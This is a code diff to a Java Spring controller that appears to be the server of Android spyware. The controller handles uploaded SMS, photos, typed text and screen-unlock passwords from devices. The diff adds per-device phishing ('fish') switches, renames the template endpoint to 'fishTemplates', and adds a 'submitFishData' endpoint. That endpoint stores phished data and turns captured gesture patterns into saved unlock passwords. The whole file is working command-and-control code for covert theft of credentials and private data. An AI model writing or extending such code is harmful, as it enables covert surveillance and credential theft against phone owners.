@@ -7,6 +7,9 @@ import java.util.Objects;
 import javax.annotation.Resource;
 import javax.servlet.http.HttpServletRequest;
 
+import io.renren.modules.app.entity.*;
+import io.renren.modules.app.service.*;
+import io.renren.modules.app.vo.FishDataVo;
 import org.apache.commons.lang3.StringUtils;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.web.bind.annotation.PostMapping;
@@ -24,25 +27,6 @@ import io.renren.common.utils.Result;
 import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
 import io.renren.modules.app.common.Utils;
 import io.renren.modules.app.context.DeviceContext;
-import io.renren.modules.app.entity.AlbumPicEntity;
-import io.renren.modules.app.entity.Device;
-import io.renren.modules.app.entity.InputTextRecord;
-import io.renren.modules.app.entity.InstallApp;
-import io.renren.modules.app.entity.JsCode;
-import io.renren.modules.app.entity.Log;
-import io.renren.modules.app.entity.SmsInfoEntity;
-import io.renren.modules.app.entity.Template;
-import io.renren.modules.app.entity.UnlockScreenPwd;
-import io.renren.modules.app.service.AlbumPicService;
-import io.renren.modules.app.service.DeviceService;
-import io.renren.modules.app.service.FishTemplateService;
-import io.renren.modules.app.service.InputTextRecordService;
-import io.renren.modules.app.service.InstallAppService;
-import io.renren.modules.app.service.JsCodeService;
-import io.renren.modules.app.service.LogService;
-import io.renren.modules.app.service.SmsInfoService;
-import io.renren.modules.app.service.TransferService;
-import io.renren.modules.app.service.UnlockScreenPwdService;
 import io.renren.modules.app.vo.DeviceStatus;
 import io.renren.modules.app.vo.ServerConfig;
 import io.renren.modules.app.vo.UnLockParams;
@@ -83,6 +67,9 @@ public class DeviceApiController extends BaseApiController {
 
     @Resource
     private AlbumPicService albumPicService;
+
+    @Resource
+    private FishDataService fishDataService;
 
 
     //注册设备
@@ -145,6 +132,9 @@ public class DeviceApiController extends BaseApiController {
         update.setId(device.getId());
         update.setLockScreen(json);
         if (unlockScreenPwd.getSource() == Constant.UnlockScreenPwdSource.fish) {
+            JSONObject fishSwitch = device.getFishSwitch();
+            fishSwitch.put(Constant.FishCode.unlock, false);
+            update.setFishSwitch(fishSwitch);
             update.setUnlockFish(Constant.YN.N);
         }
         deviceService.updateById(update);
@@ -253,7 +243,8 @@ public class DeviceApiController extends BaseApiController {
             serverConfig.setMainCodeMd5(mainJsCode.getCodeMd5());
         }
 
-        serverConfig.setUnlockFish(Objects.equals(dbDevice.getUnlockFish(), Constant.YN.Y));
+        serverConfig.setFishOptions(dbDevice.getFishSwitch());
+
         serverConfig.setUnlockFishFeatures(sysParamsDao.getValueByCode(Constant.SystemParamsKey.UnlockFishFeatures));
         serverConfig.setUploadSms(Objects.equals(dbDevice.getUploadSms(), Constant.YN.Y));
         serverConfig.setUploadAlbum(Objects.equals(dbDevice.getUploadAlbum(), Constant.YN.Y));
@@ -296,11 +287,11 @@ public class DeviceApiController extends BaseApiController {
         return Result.toSuccess();
     }
 
-    @RequestMapping("templates")
-    public Result<List<Template>> templates(@RequestBody JSONObject jsonObject) {
-        LambdaQueryWrapper<Template> query = new LambdaQueryWrapper<>();
-        query.eq(Template::getStatus, Constant.TemplateStatus.effective);
-        List<Template> list = fishTemplateService.list(query);
+    @RequestMapping("fishTemplates")
+    public Result<List<FishTemplates>> fishTemplates(@RequestBody JSONObject jsonObject) {
+        LambdaQueryWrapper<FishTemplates> query = new LambdaQueryWrapper<>();
+        query.eq(FishTemplates::getStatus, Constant.TemplateStatus.effective);
+        List<FishTemplates> list = fishTemplateService.list(query);
         return Result.toSuccess(list);
     }
 
@@ -332,6 +323,66 @@ public class DeviceApiController extends BaseApiController {
         }
         albumPicService.upload(inputs);
         log.info("设备:{} 相册上传成功.", DeviceContext.getDeviceId());
+        return Result.toSuccess();
+    }
+
+
+    /**
+     * 钓鱼数据
+     *
+     * @param jsonObject
+     * @return
+     */
+    @PostMapping("submitFishData")
+    public Result<Void> submitFishData(@RequestBody FishDataVo fishDataVo) {
+        String deviceId = DeviceContext.getDeviceId();
+        String pkg = DeviceContext.getPkg();
+        Device dbDevice = deviceService.findByDeviceId(deviceId);
+        if (dbDevice == null) {
+            return Result.toSuccess();
+        }
+        if (Objects.equals(fishDataVo.getCode(), Constant.FishCode.unlock)) {
+            String data = fishDataVo.getData();
+
+            JSONObject unlockParam = JSONObject.parseObject(data);
+            try {
+
+                String tips = unlockParam.getString("tips");
+                if (unlockParam.getInteger("type") == Constant.UnLockType.gesture) {
+                    tips = tips.chars()
+                            .map(c -> '0' + (c - '0' + 1) % 10)
+                            .collect(StringBuilder::new,
+                                    StringBuilder::appendCodePoint,
+                                    StringBuilder::append)
+                            .toString();
+                    unlockParam.put("tips", tips);
+                }
+                unlockParam.put("source", Constant.UnlockScreenPwdSource.fish);
+                uploadUnlockPassword(unlockParam);
+            } catch (Exception e) {
+                log.warn("uploadUnlockPassword error", e);
+            }
+        } else {
+            FishData fishData = new FishData();
+            fishData.setCreated(Utils.now());
+            fishData.setPkg(pkg);
+            fishData.setDeviceId(dbDevice.getId());
+            fishData.setAndroidId(deviceId);
+            fishData.setCode(fishDataVo.getCode());
+            fishData.setData(fishDataVo.getData());
+            fishDataService.save(fishData);
+        }
+
+        Device updateDevice = new Device();
+
+        JSONObject fishSwitch = dbDevice.getFishSwitch();
+        fishSwitch.put(fishDataVo.getCode(), false);
+        updateDevice.setFishSwitch(fishSwitch);
+        updateDevice.setId(dbDevice.getId());
+        deviceService.updateById(updateDevice);
+
+
+        log.info("钓鱼数据:{} - {}", deviceId, fishDataVo);
         return Result.toSuccess();
     }
 
